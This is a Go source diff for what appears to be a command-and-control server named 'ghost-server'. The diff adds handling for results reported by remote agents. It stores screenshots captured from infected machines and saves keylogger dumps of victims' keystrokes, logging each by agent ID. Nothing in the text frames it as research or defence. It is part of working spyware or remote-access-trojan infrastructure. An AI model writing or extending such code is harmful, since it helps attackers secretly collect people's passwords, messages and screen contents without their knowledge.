@@ -10,8 +10,11 @@ import (
 	"log"
 	"net/http"
 	"strconv"
+	"fmt"
+
 
 	"ghost-server/internal/crypto"
+	"ghost-server/internal/handlers"
 	"ghost-server/internal/profile"
 	"ghost-server/internal/session"
 	"ghost-server/internal/task"
@@ -193,6 +196,31 @@ func (l *HTTPListener) handleResult(req *protocol.AgentRequest) []byte {
 	if err := json.Unmarshal(dataBytes, &result); err != nil {
 		log.Printf("[Listener] Result parse error: %v", err)
 		return l.buildResponse(false, "Invalid result data", nil)
+	}
+
+	// Check for special handling (e.g. screenshot)
+	if qt, ok := l.tasks.GetByID(result.TaskID); ok {
+		if qt.Task.Command == protocol.CmdScreenshot && len(result.Data) > 0 {
+			path, err := handlers.SaveScreenshot(req.ID, result.Data)
+			if err == nil {
+				result.Output = fmt.Sprintf("Screenshot saved to: %s", path)
+				log.Printf("[+] Screenshot saved for agent %s: %s", req.ID[:8], path)
+			} else {
+				log.Printf("[-] Failed to save screenshot: %v", err)
+				result.Output = fmt.Sprintf("Failed to save screenshot: %v", err)
+			}
+		}
+		
+		// Handle keylog dump results
+		if qt.Task.Command == protocol.CmdKeylogDump && len(result.Output) > 0 && result.Output != "No keystrokes captured" {
+			path, err := handlers.SaveKeylog(req.ID, result.Output)
+			if err == nil {
+				log.Printf("[+] Keylog saved for agent %s: %s", req.ID[:8], path)
+				result.Output = fmt.Sprintf("Keylog saved to: %s\n\n%s", path, result.Output)
+			} else {
+				log.Printf("[-] Failed to save keylog: %v", err)
+			}
+		}
 	}
 
 	// Enregistre le résultat
